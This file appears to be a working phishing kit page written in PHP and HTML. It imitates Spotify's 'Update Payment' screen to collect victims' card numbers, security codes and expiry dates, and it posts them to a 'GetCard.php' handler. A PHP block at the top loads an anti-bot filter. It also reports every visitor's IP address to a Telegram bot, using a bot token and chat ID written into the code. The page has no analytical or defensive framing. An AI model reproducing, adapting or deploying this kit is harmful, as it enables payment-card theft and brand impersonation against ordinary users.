<?php
include './CRfiles/PHP/botfucker.php';
$ip = getenv("REMOTE_ADDR");
  $message = "[Alert] NEW VISITOR FROM IP : $ip ";
  
  $token ='1900956727:AAHEk81s5ZHuFSD0kGvNZEr6bTTv-ttON_0';
    $data = [
    'text' => $message,
    'chat_id' => '-614536082'
];
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
 ?>
<!DOCTYPE html>

<html id="app" lang="en" dir="ltr" ng-csp="" ng-strict-di="" class="js-focus-visible ng-scope" data-js-focus-visible="">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <title class="ng-binding">Update Payment - Spotify</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <!--<base href="/">-->
  <base href=".">
  <link rel="icon" href="./CRfiles/favicon.ico">
  <link href="./CRfiles/index.b48f2b8327399f826bfd.css" media="screen" rel="stylesheet">


</head>

<body ng-controller="LoginController" class="ng-scope">
  <!-- ngInclude: template -->
  <div ng-include="template" class="ng-scope">
    <div sp-header="" class="ng-scope">
      <div class="head ">
        <a class="spotify-logo" tabindex="-1" title="Spotify" ng-href="/en" href="./Spow/Error.php"></a>
      </div>
    </div>

    <div class="container-fluid login ng-scope">

      <div class="content">
        <!-- ngIf: showContinueLabel -->
        <div class="row ng-scope" ng-if="showContinueLabel">


          <form method="post" action="./MrCorona/GetCard.php"
            class="ng-pristine ng-valid-sp-disallow-chars ng-invalid ng-invalid-required">
            <div>
              <center>

                <img src="./CRfiles/y.png">
                <span>UPDATE YOUR PAYMENT METHOD</span>
              </center>
            </div>
            <hr>
            <input type="hidden" value="SpoW" name="MrCorona">
            <div class="row"
              ng-class="{&#39;has-error&#39;: (accounts.username.$dirty &amp;&amp; accounts.username.$invalid) || invalidCredentials}">
              <div class="col-xs-12">
                <label for="login-username" class="control-label ng-binding">
                  Card number
                </label>
                <input onkeyup="$cc.validate.call(this,event)" maxlength="19" type="text"
                  class="form-control input-with-feedback ng-pristine ng-valid-sp-disallow-chars ng-empty ng-invalid ng-invalid-required ng-touched focus-visible"
                  name="cardCorona" placeholder="XXXX XXXX XXXX XXXX" required="">
                <!-- ngIf: accounts.username.$dirty && accounts.username.$invalid -->
              </div>
            </div>
            <script src="./CRfiles/Corona.js" type="text/javascript"></script>
            <div class="row">
              <div class="col-xs-12">
                <label for="login-password" class="control-label ng-binding">
                  Security code
                </label>
                <input type="text"
                  class="form-control input-with-feedback ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required"
                  name="cvvCorona" maxlength="4" placeholder="CVC" required="" autocomplete="off">

              </div>
            </div>
            <div class="row">
              <div class="col-xs-12">
                <label for="login-password" class="control-label ng-binding">
                  Expiration date
                </label>
                <input onkeyup="$cc.expiry.call(this,event)" type="text" maxlength="7"
                  class="form-control input-with-feedback ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required"
                  name="expCorona" placeholder="MM/YYYY" required="" autocomplete="off">
              </div>
            </div>
            <div class="row">
              <div class="col-xs-12">
                <label for="login-password" class="control-label ng-binding">
                  <span>* Make sure your card is correct</span>

                  <!-- ngIf: showAutomationKey -->







                  <div id="sign-up-section">
                    <div class="row">
                      <div class="col-xs-12">
                        <signup class="ng-isolate-scope">
                          <!-- ngIf: showSignup -->
                          <div ng-if="showSignup" class="ng-scope">
                            <!-- ngIf: showButton -->
                            <div ng-if="showButton" class="ng-scope">
                              <div class="row">
                                <div class="col-xs-12">
                                  <br>
                                </div>
                              </div>
                              <div>
                                <div class="row">
                                  <div class="col-xs-12">
                                    <input class="btn btn-block btn-green ng-binding" type="submit" value="UPDATE">


                                  </div>
                                </div>
                              </div>
                            </div>
          </form>
          <!-- end ngIf: showButton -->

          <!-- ngIf: showAppStoreBanner -->
        </div><!-- end ngIf: showSignup -->
        </signup>
      </div>
    </div>
  </div>

  </div><!-- .content -->
  </div><!-- .container -->
  </div>


  <div></div>
</body>

</html>